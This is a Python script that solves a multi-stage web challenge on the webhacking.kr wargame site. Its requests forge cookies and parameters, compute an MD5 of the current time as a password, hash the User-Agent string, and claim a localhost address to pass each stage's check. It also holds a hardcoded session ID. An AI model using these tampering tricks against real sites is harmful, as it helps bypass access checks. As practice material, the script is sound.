import requests
import time
import hashlib

url = "https://webhacking.kr/challenge/bonus-6/"
cookies = {'PHPSESSID':'trbj3qr3f2askk2nsgbarcsv8c'}

# 33-2
params = {'post':'hehe', 'post2':'hehe2'}

res = requests.post(url + "lv2.php", cookies = cookies, data=params)
print(res.text)

# 33-4
cur_time = str(int(time.time()))
enc = hashlib.md5(cur_time.encode()).hexdigest()
res = requests.get(url + "l4.php" + "?password=" + enc, cookies = cookies)
print(res.text)

# 33-5
cookies['imcookie'] = '1'
params = {'impost':1}
query = "md555.php?imget=1"

res = requests.post(url + query, cookies = cookies, data = params)
print(res.text)

# 33-6
ip = '[ip_addr]'
md5_ip = str(hashlib.md5(ip.encode()).hexdigest())

user = 'python-requests/2.32.3'
md5_user = str(hashlib.md5(user.encode()).hexdigest())

cookies['test'] = md5_ip
params = {'kk':md5_user}
res = requests.post(url + "gpcc.php", cookies = cookies, data = params)
print(res.text)

# 33-7
re_ip = ip.replace(".", "")
res = requests.get(url + "wtff.php?" + re_ip + "=" + re_ip, cookies = cookies)
print(res.text)

# 33-8
res = requests.get(url + "ipt.php?addr=127.0.0.1", cookies = cookies)
print(res.text)

# 33-9
ans = ""
for i in range(97, 123, 2):
	ans += chr(i)
res = requests.get(url + "nextt.php?ans=" + ans, cookies = cookies)
print(res.text)

